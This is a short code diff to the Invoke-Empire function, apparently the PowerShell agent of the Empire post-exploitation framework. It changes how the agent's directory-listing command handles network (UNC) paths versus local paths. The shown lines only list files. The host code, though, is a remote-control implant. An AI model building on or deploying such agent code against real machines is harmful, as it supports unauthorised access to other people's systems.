@@ -267,7 +267,12 @@ function Invoke-Empire {
                 }
                 else {
                     try{
-                        $output = Get-ChildItem -force -path "FileSystem::$cmdargs" -ErrorAction Stop | select lastwritetime,length,name
+                        if ($cmdargs.StartsWith("\\")) {
+                            $output = Get-ChildItem -force -path "FileSystem::$cmdargs" -ErrorAction Stop | select lastwritetime,length,name    
+                        }
+                        else {
+                            $output = Get-ChildItem -force -path "$cmdargs" -ErrorAction Stop | select lastwritetime,length,name
+                        }
                     }
                     catch [System.Management.Automation.ActionPreferenceStopException]{
                         $output = "[!] Error: $_ (or cannot be accessed)."
